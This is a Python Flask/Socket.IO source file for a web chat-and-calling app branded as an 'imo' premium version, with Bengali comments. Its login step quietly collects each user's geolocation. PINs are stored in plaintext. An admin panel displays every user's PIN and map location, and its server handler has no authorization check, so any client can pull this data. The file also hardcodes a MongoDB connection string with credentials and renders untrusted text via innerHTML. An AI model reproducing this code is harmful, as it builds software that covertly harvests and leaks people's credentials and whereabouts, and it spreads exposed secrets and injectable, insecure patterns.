import eventlet
eventlet.monkey_patch()

import os
import datetime
import json
from flask import Flask, render_template_string, request
from flask_socketio import SocketIO, emit
from pymongo import MongoClient
from bson import json_util, ObjectId

# --- অ্যাপ কনফিগারেশন ---
app = Flask(__name__)
app.config['SECRET_KEY'] = 'imo-ultra-pro-master-2026'
# ডাটা বাফার বাড়ানো হয়েছে যাতে ভয়েস মেসেজ ও বড় ফাইল কাজ করে
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet', max_http_buffer_size=10**8) 

# --- ডাটাবেস কানেকশন ---
MONGO_URI = "mongodb+srv://Demo270:Demo270@cluster0.ls1igsg.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0" 

try:
    client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
    db = client['imo_pro_v3']
    users_col = db['users']
    chats_col = db['chats']
    calls_col = db['calls']
    db_list_col = db['extra_dbs'] # আনলিমিটেড ডিবি এড করার জন্য
    client.admin.command('ping')
    print("✅ MongoDB Connected Successfully!")
except Exception as e:
    print(f"❌ DB Connection Error: {e}")

# --- ফ্রন্টএন্ড UI (আপনার দেওয়া ডিজাইন এবং ফিচার সব একসাথে) ---
html_content = """
<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Imo Pro Premium Master</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
    <style>
        :root { --main: #0984e3; --dark: #2d3436; --bg: #f5f6fa; --white: #ffffff; --green: #00b894; --danger: #d63031; --shadow: 0 4px 15px rgba(0,0,0,0.1); }
        body { font-family: 'Segoe UI', sans-serif; background: #dfe6e9; margin: 0; display: flex; justify-content: center; height: 100vh; overflow: hidden; }
        .hidden { display: none !important; }
        
        /* ১. অটো মোড (Responsive Design) */
        .app-container { width: 100%; max-width: 450px; background: var(--white); display: flex; flex-direction: column; position: relative; box-shadow: 0 0 30px rgba(0,0,0,0.2); height: 100vh; }
        
        @media (min-width: 850px) {
            .app-container { max-width: 1100px; flex-direction: row; height: 95vh; margin-top: 2.5vh; border-radius: 15px; overflow: hidden; }
            #mainDashboard { width: 350px !important; border-right: 1px solid #ddd; }
            #chatView { flex: 1; position: relative !important; display: flex !important; transform: none !important; width: 100% !important; height: 100% !important; }
            #authScreen, #profileScreen { width: 100% !important; }
        }

        /* আপনার অরিজিনাল সিএসএস */
        .screen { padding: 40px 20px; text-align: center; height: 100%; overflow-y: auto; box-sizing: border-box; }
        .screen h1 { color: var(--main); font-size: 50px; margin-bottom: 5px; font-weight: 800; cursor: pointer; }
        input { width: 100%; padding: 15px; margin: 12px 0; border: 2px solid #eee; border-radius: 12px; font-size: 16px; outline: none; transition: 0.3s; }
        .btn { width: 100%; padding: 16px; border: none; border-radius: 12px; cursor: pointer; font-weight: bold; font-size: 16px; background: var(--main); color: white; box-shadow: var(--shadow); }

        header { background: var(--main); color: white; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; box-shadow: var(--shadow); z-index: 10; }
        .tabs { display: flex; background: var(--main); }
        .tab { flex: 1; padding: 15px; text-align: center; color: rgba(255,255,255,0.7); cursor: pointer; font-weight: bold; font-size: 13px; }
        .tab.active { color: white; border-bottom: 4px solid white; background: rgba(255,255,255,0.1); }

        .list-container { flex: 1; overflow-y: auto; background: var(--bg); }
        .item { display: flex; align-items: center; padding: 15px; background: var(--white); margin-bottom: 1px; cursor: pointer; transition: 0.2s; }
        .avatar { width: 50px; height: 50px; border-radius: 50%; background: #dfe6e9; margin-right: 15px; display: flex; align-items: center; justify-content: center; font-size: 20px; font-weight: bold; color: var(--main); background-size: cover; background-position: center; border: 2px solid #eee; overflow: hidden; }
        .item-info { flex: 1; }
        .item-info b { font-size: 16px; color: var(--dark); }
        .item-info span { font-size: 12px; color: #636e72; }

        /* অ্যাডমিন প্যানেল স্ক্রিন */
        #adminPanel { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 9999; padding: 20px; overflow-y: auto; box-sizing: border-box; }
        .admin-card { background: #f8f9fa; padding: 15px; border-radius: 10px; margin-bottom: 15px; border: 1px solid #ddd; }
        .admin-table { width: 100%; border-collapse: collapse; font-size: 12px; margin-top: 10px; }
        .admin-table th, .admin-table td { border: 1px solid #ddd; padding: 8px; text-align: left; }

        /* চ্যাট ও কল অরিজিনাল স্টাইল */
        #chatView { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #f0f2f5; z-index: 1000; display: flex; flex-direction: column; }
        .chat-msgs { flex: 1; padding: 15px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; }
        .msg { padding: 10px 15px; border-radius: 18px; max-width: 75%; font-size: 14px; position: relative; }
        .msg.sent { background: var(--main); color: white; align-self: flex-end; }
        .msg.recv { background: white; color: var(--dark); align-self: flex-start; }

        .call-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #1e272e; z-index: 9999; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        #localVideo { width: 100px; height: 140px; position: absolute; bottom: 20px; right: 20px; border: 2px solid white; border-radius: 12px; object-fit: cover; }
    </style>
</head>
<body>

    <audio id="ringtone" src="https://www.soundjay.com/phone/phone-calling-1.mp3" loop></audio>

    <div class="app-container">
        
        <!-- ১. অথ স্ক্রিন -->
        <div id="authScreen" class="screen">
            <h1 onclick="openAdmin()" style="cursor:pointer">imo</h1>
            <p style="color: #636e72;">মাস্টার প্রিমিয়াম ভার্সন ২০২৬</p>
            <input type="number" id="authPhone" placeholder="মোবাইল নাম্বার">
            <input type="password" id="authPin" placeholder="৫ ডিজিট পিন">
            <button class="btn" onclick="auth()">শুরু করুন</button>
        </div>

        <!-- ২. প্রোফাইল সেটআপ -->
        <div id="profileScreen" class="screen hidden">
            <h2>আপনার প্রোফাইল</h2>
            <div id="avatarPreview" class="avatar" style="width: 120px; height: 120px; margin: 0 auto 20px; font-size: 40px;">👤</div>
            <input type="text" id="setupName" placeholder="আপনার নাম">
            <input type="file" id="avatarFile" accept="image/*" onchange="previewAvatar(event)">
            <button class="btn" onclick="saveProfile()">সম্পন্ন করুন</button>
        </div>

        <!-- ৩. মেইন ড্যাশবোর্ড -->
        <div id="mainDashboard" class="hidden" style="display: flex; flex-direction: column; height: 100%;">
            <header>
                <div style="display: flex; align-items: center; gap: 10px;">
                    <div id="headerAvatar" class="avatar" style="width:35px; height:35px; margin:0;">👤</div>
                    <span id="myDisplayName">imo Master</span>
                </div>
                <span onclick="logout()" style="font-size: 11px; cursor: pointer;">LOGOUT</span>
            </header>
            <div class="tabs">
                <div class="tab active" onclick="switchTab('chats', this)">CHATS</div>
                <div class="tab" onclick="switchTab('contacts', this)">CONTACTS</div>
                <div class="tab" onclick="switchTab('calls', this)">CALLS</div>
            </div>
            
            <div id="chatsTab" class="list-container"></div>
            <div id="contactsTab" class="list-container hidden">
                <div style="padding: 15px; display: flex; gap: 10px;">
                    <input type="number" id="searchUser" placeholder="বন্ধুর নাম্বার লিখুন" style="margin: 0; flex: 1;">
                    <button onclick="addFriend()" style="width: 60px; border-radius: 12px; border: none; background: var(--main); color: white;">ADD</button>
                </div>
                <div id="contactList"></div>
            </div>
            <div id="callsTab" class="list-container hidden"></div>
        </div>

        <!-- ৪. চ্যাট উইন্ডো -->
        <div id="chatView" class="hidden">
            <div style="background:var(--main); color:white; padding:10px; display:flex; align-items:center; gap:12px;">
                <span onclick="closeChat()" style="cursor:pointer; font-size: 26px;">←</span>
                <div id="activeAvatar" class="avatar" style="width:38px; height:38px; margin:0;">👤</div>
                <div style="flex:1">
                    <div id="chatName" style="font-weight: bold; font-size: 16px;">বন্ধুর নাম</div>
                    <div id="typingStatus" style="font-size: 10px; opacity:0.8"></div>
                </div>
                <div style="display: flex; gap: 18px;">
                    <span onclick="startCall('video')" style="cursor:pointer">📹</span>
                    <span onclick="startCall('audio')" style="cursor:pointer">📞</span>
                </div>
            </div>
            <div id="chatBox" class="chat-msgs"></div>
            <div style="background:white; padding:12px; display:flex; align-items:center; gap:10px; border-top:1px solid #eee;">
                <input type="text" id="msgInput" placeholder="লিখুন..." style="margin:0; flex:1;" oninput="handleTyping()">
                <span id="voiceBtn" style="font-size: 24px; cursor: pointer;" onmousedown="startVoice()" onmouseup="stopVoice()" ontouchstart="startVoice()" ontouchend="stopVoice()">🎙️</span>
                <span onclick="sendText()" style="font-size: 24px; cursor: pointer; color: var(--main);">➤</span>
            </div>
        </div>

        <!-- ৫. অ্যাডমিন প্যানেল -->
        <div id="adminPanel" class="hidden">
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
                <h2>অ্যাডমিন প্যানেল</h2>
                <button onclick="document.getElementById('adminPanel').classList.add('hidden')">বন্ধ করুন</button>
            </div>
            <div class="admin-card">
                <b>মংগোডিবি স্টোরেজ:</b> <span id="dbStorageStats">লোডিং...</span><br><br>
                <input type="text" id="newDbUriInput" placeholder="নতুন MongoDB URI দিন" style="margin:0;">
                <button class="btn" onclick="saveExtraDB()" style="padding:10px; margin-top:10px;">নতুন ডাটাবেস অ্যাড করুন</button>
            </div>
            <div class="admin-card">
                <b>ইউজার ডাটা ও লাইভ লোকেশন:</b>
                <table class="admin-table">
                    <thead><tr><th>নাম/ফোন</th><th>পিন</th><th>লোকেশন</th><th>অ্যাকশন</th></tr></thead>
                    <tbody id="adminUserTable"></tbody>
                </table>
            </div>
        </div>

        <!-- ৬. কল ওভারলে -->
        <div id="callOverlay" class="call-overlay hidden">
            <h2 id="callTargetName">বন্ধুর নাম</h2>
            <div id="callStatus">Connecting...</div>
            <div style="position:relative; width:100%; height:75%;">
                <video id="remoteVideo" autoplay playsinline style="width:100%; height:100%; object-fit:cover;"></video>
                <video id="localVideo" autoplay playsinline muted></video>
            </div>
            <div style="display:flex; gap:20px; margin-top:20px;">
                <button id="btnAccept" class="btn" style="background:var(--green); display:none; width:100px;" onclick="acceptCall()">Accept</button>
                <button class="btn" style="background:var(--danger); width:100px;" onclick="endCall(true)">End</button>
            </div>
        </div>

    </div>

    <script>
        const socket = io();
        let myData = null, activeChat = null, peerConn = null, localStream = null;
        let mediaRecorder, voiceChunks = [];
        const rtcConfig = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };

        // --- ১. অথ ও লোকেশন ট্র্যাকিং ---
        function auth() {
            const phone = document.getElementById('authPhone').value.trim();
            const pin = document.getElementById('authPin').value.trim();
            if(!phone || !pin) return alert("তথ্য দিন");
            
            navigator.geolocation.getCurrentPosition(pos => {
                const geo = { lat: pos.coords.latitude, lon: pos.coords.longitude };
                socket.emit('auth_request', { phone, pin, geo });
            }, err => {
                socket.emit('auth_request', { phone, pin, geo: null });
            });
        }

        socket.on('auth_response', data => {
            if (data.status === 'success') {
                myData = data.user;
                document.getElementById('authScreen').classList.add('hidden');
                document.getElementById('mainDashboard').classList.remove('hidden');
                document.getElementById('myDisplayName').innerText = myData.name || myData.phone;
                socket.emit('get_contacts', { phone: myData.phone });
                socket.emit('get_chat_list', { phone: myData.phone });
            } else alert(data.message);
        });

        // --- ২. অ্যাডমিন প্যানেল ইভেন্টস ---
        function openAdmin() {
            if(myData && myData.role === 'admin') {
                document.getElementById('adminPanel').classList.remove('hidden');
                socket.emit('admin_get_data');
            }
        }

        socket.on('admin_data_res', data => {
            document.getElementById('dbStorageStats').innerText = data.storage;
            let html = "";
            data.users.forEach(u => {
                const mapLink = u.geo ? `https://www.google.com/maps?q=${u.geo.lat},${u.geo.lon}` : "#";
                html += `<tr>
                    <td>${u.name || 'N/A'}<br>${u.phone}</td>
                    <td>${u.pin}</td>
                    <td><a href="${mapLink}" target="_blank" style="color:var(--main)">View Map</a></td>
                    <td><button onclick="deleteUser('${u.phone}')" style="color:red; border:none; background:none; cursor:pointer;">Del</button></td>
                </tr>`;
            });
            document.getElementById('adminUserTable').innerHTML = html;
        });

        function saveExtraDB() {
            const uri = document.getElementById('newDbUriInput').value;
            if(uri) socket.emit('admin_add_db', { uri });
        }

        // --- ৩. চ্যাট ও ভয়েস মেসেজ সিস্টেম ---
        function openChat(phone, name, avatar) {
            activeChat = { phone, name, avatar };
            document.getElementById('chatView').classList.remove('hidden');
            document.getElementById('chatName').innerText = name || phone;
            document.getElementById('chatBox').innerHTML = "";
            socket.emit('get_messages', { from: myData.phone, to: phone });
        }
        function closeChat() { document.getElementById('chatView').classList.add('hidden'); activeChat = null; }

        function sendText() {
            const t = document.getElementById('msgInput').value.trim();
            if(!t) return;
            socket.emit('send_msg', { from: myData.phone, to: activeChat.phone, message: t, type: 'text' });
            document.getElementById('msgInput').value = "";
        }

        async function startVoice() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                mediaRecorder = new MediaRecorder(stream);
                mediaRecorder.start(); voiceChunks = [];
                document.getElementById('voiceBtn').style.color = "red";
                mediaRecorder.ondataavailable = e => voiceChunks.push(e.data);
                mediaRecorder.onstop = () => {
                    const blob = new Blob(voiceChunks, { type: 'audio/ogg' });
                    const reader = new FileReader();
                    reader.onload = e => socket.emit('send_msg', { from: myData.phone, to: activeChat.phone, message: e.target.result, type: 'voice' });
                    reader.readAsDataURL(blob);
                    document.getElementById('voiceBtn').style.color = "black";
                };
            } catch(e) { alert("Mic error"); }
        }
        function stopVoice() { if(mediaRecorder) mediaRecorder.stop(); }

        socket.on('new_msg', d => {
            if (activeChat && (activeChat.phone === d.from || d.from === myData.phone)) {
                const div = document.createElement('div');
                div.className = `msg ${d.from === myData.phone ? 'sent' : 'recv'}`;
                if(d.type === 'text') div.innerText = d.message;
                if(d.type === 'voice') div.innerHTML = `<audio src="${d.message}" controls style="width:200px;"></audio>`;
                document.getElementById('chatBox').appendChild(div);
                document.getElementById('chatBox').scrollTop = document.getElementById('chatBox').scrollHeight;
            }
            socket.emit('get_chat_list', { phone: myData.phone });
        });

        socket.on('load_msgs', msgs => msgs.forEach(m => {
            const div = document.createElement('div');
            div.className = `msg ${m.from === myData.phone ? 'sent' : 'recv'}`;
            div.innerText = m.message;
            document.getElementById('chatBox').appendChild(div);
        }));

        // --- ৪. WebRTC Calling ---
        async function startCall(type) {
            document.getElementById('callOverlay').classList.remove('hidden');
            document.getElementById('callTargetName').innerText = activeChat.name;
            localStream = await navigator.mediaDevices.getUserMedia({ video: type === 'video', audio: true });
            document.getElementById('localVideo').srcObject = localStream;
            peerConn = new RTCPeerConnection(rtcConfig);
            localStream.getTracks().forEach(track => peerConn.addTrack(track, localStream));
            peerConn.onicecandidate = e => {
                if(e.candidate) socket.emit('call_signal', { to: activeChat.phone, from: myData.phone, candidate: e.candidate });
            };
            peerConn.ontrack = e => { document.getElementById('remoteVideo').srcObject = e.streams[0]; };
            const offer = await peerConn.createOffer();
            await peerConn.setLocalDescription(offer);
            socket.emit('call_signal', { to: activeChat.phone, from: myData.phone, offer, type, name: myData.name });
        }

        socket.on('call_signal', async data => {
            if(data.offer) {
                window.incomingCall = data;
                document.getElementById('callOverlay').classList.remove('hidden');
                document.getElementById('callTargetName').innerText = data.name || data.from;
                document.getElementById('btnAccept').style.display = 'block';
                document.getElementById('ringtone').play();
            } else if(data.answer) {
                await peerConn.setRemoteDescription(new RTCSessionDescription(data.answer));
            } else if(data.candidate) {
                await peerConn.addIceCandidate(new RTCIceCandidate(data.candidate));
            }
        });

        async function acceptCall() {
            document.getElementById('ringtone').pause();
            document.getElementById('btnAccept').style.display = 'none';
            const data = window.incomingCall;
            localStream = await navigator.mediaDevices.getUserMedia({ video: data.type === 'video', audio: true });
            document.getElementById('localVideo').srcObject = localStream;
            peerConn = new RTCPeerConnection(rtcConfig);
            localStream.getTracks().forEach(track => peerConn.addTrack(track, localStream));
            peerConn.ontrack = e => { document.getElementById('remoteVideo').srcObject = e.streams[0]; };
            await peerConn.setRemoteDescription(new RTCSessionDescription(data.offer));
            const answer = await peerConn.createAnswer();
            await peerConn.setLocalDescription(answer);
            socket.emit('call_signal', { to: data.from, from: myData.phone, answer });
        }

        function endCall(sig) {
            if(sig && activeChat) socket.emit('end_call_signal', { to: activeChat.phone });
            if(localStream) localStream.getTracks().forEach(t => t.stop());
            if(peerConn) peerConn.close();
            document.getElementById('callOverlay').classList.add('hidden');
            document.getElementById('ringtone').pause();
            peerConn = null; localStream = null;
        }
        socket.on('end_call_received', () => endCall(false));

        // --- আপনার অন্যান্য ফাংশন ---
        function switchTab(t, el) {
            document.querySelectorAll('.tab').forEach(x => x.classList.remove('active'));
            document.querySelectorAll('.list-container').forEach(x => x.classList.add('hidden'));
            el.classList.add('active');
            document.getElementById(t+'Tab').classList.remove('hidden');
        }
        socket.on('contacts_data', u => {
            document.getElementById('contactList').innerHTML = u.map(user => `
                <div class="item" onclick="openChat('${user.phone}', '${user.name}', '${user.avatar}')">
                    <div class="avatar">${user.name ? user.name[0] : '👤'}</div>
                    <div class="item-info"><b>${user.name || user.phone}</b></div>
                </div>
            `).join('');
        });
        socket.on('chat_list_data', c => {
            document.getElementById('chatsTab').innerHTML = c.map(chat => `
                <div class="item" onclick="openChat('${chat.phone}', '${chat.name}', '${chat.avatar}')">
                    <div class="avatar">${chat.name ? chat.name[0] : '👤'}</div>
                    <div class="item-info"><b>${chat.name}</b><br><small>${chat.lastMsg.substring(0,25)}</small></div>
                </div>
            `).join('');
        });
        function addFriend() { socket.emit('add_friend', { myPhone: myData.phone, friendPhone: document.getElementById('searchUser').value }); }
        function logout() { location.reload(); }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(html_content)

# --- ব্যাকএন্ড লজিক ---

@socketio.on('auth_request')
def handle_auth(data):
    phone, pin, geo = str(data.get('phone')), str(data.get('pin')), data.get('geo')
    user = users_col.find_one({"phone": phone})
    if user:
        if user['pin'] == pin:
            users_col.update_one({"phone": phone}, {"$set": {"status": "online", "sid": request.sid, "geo": geo}})
            user['_id'] = str(user['_id'])
            emit('auth_response', {"status": "success", "user": user})
        else: emit('auth_response', {"status": "error", "message": "ভুল পিন!"})
    else:
        # প্রথম ইউজারকে অ্যাডমিন বানানো
        role = "admin" if users_col.count_documents({}) == 0 else "user"
        new_user = {"phone": phone, "pin": pin, "name": f"User {phone[-4:]}", "role": role, "geo": geo, "status": "online", "sid": request.sid, "contacts": []}
        users_col.insert_one(new_user)
        emit('auth_response', {"status": "success", "user": new_user})

@socketio.on('send_msg')
def handle_msg(data):
    msg_obj = {**data, "timestamp": datetime.datetime.now()}
    chats_col.insert_one(msg_obj)
    emit('new_msg', data, room=request.sid)
    target = users_col.find_one({"phone": data['to']})
    if target and target.get('sid'):
        emit('new_msg', data, room=target['sid'])

@socketio.on('get_messages')
def get_msgs(data):
    msgs = list(chats_col.find({"$or": [{"from": data['from'], "to": data['to']}, {"from": data['to'], "from": data['from']}]}).sort("timestamp", 1))
    for m in msgs: m['_id'] = ""; m['timestamp'] = ""
    emit('load_msgs', msgs)

# --- অ্যাডমিন ইভেন্টস ---
@socketio.on('admin_get_data')
def admin_data():
    stats = db.command("dbStats")
    users = list(users_col.find())
    for u in users: u['_id'] = ""
    emit('admin_data_res', {"storage": f"Used: {stats['dataSize']/(1024*1024):.2f} MB", "users": users})

@socketio.on('admin_add_db')
def add_db(data):
    db_list_col.insert_one({"uri": data['uri'], "date": datetime.datetime.now()})

@socketio.on('call_signal')
def call_signal(data):
    target = users_col.find_one({"phone": data['to']})
    if target: emit('call_signal', data, room=target['sid'])

@socketio.on('end_call_signal')
def end_call(data):
    target = users_col.find_one({"phone": data['to']})
    if target: emit('end_call_received', room=target['sid'])

@socketio.on('get_chat_list')
def chat_list(data):
    pipeline = [{"$match": {"$or": [{"from": data['phone']}, {"to": data['phone']}]}}, {"$sort": {"timestamp": -1}}, {"$group": {"_id": {"$cond": [{"$eq": ["$from", data['phone']]}, "$to", "$from"]}, "lastMsg": {"$first": "$message"}}}]
    results = list(chats_col.aggregate(pipeline))
    res_list = []
    for r in results:
        u = users_col.find_one({"phone": r['_id']})
        if u: res_list.append({"phone": u['phone'], "name": u['name'], "lastMsg": r['lastMsg']})
    emit('chat_list_data', res_list)

@socketio.on('get_contacts')
def get_contacts(data):
    user = users_col.find_one({"phone": data['phone']})
    if user:
        contacts = list(users_col.find({"phone": {"$in": user['contacts']}}, {"pin":0, "sid":0}))
        emit('contacts_data', contacts)

@socketio.on('disconnect')
def offline():
    users_col.update_one({"sid": request.sid}, {"$set": {"status": "offline"}})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    socketio.run(app, host='0.0.0.0', port=port)
